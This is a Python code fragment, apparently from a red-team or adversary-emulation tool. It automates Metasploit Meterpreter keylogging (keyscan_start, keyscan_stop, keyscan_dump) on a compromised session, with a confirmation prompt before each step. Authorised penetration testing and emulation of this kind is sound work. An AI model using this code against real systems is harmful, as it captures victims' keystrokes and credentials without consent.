...
async def main():
    ...
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: keyscan_start[/]")
    confirm_action()
    try:
        metasploit_executor.keyscan_start(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    ...
    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: keyscan_stop[/]")
    confirm_action()
    try:
        metasploit_executor.keyscan_stop(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    ...
    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: keyscan_dump[/]")
    confirm_action()
    try:
        metasploit_executor.keyscan_dump(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
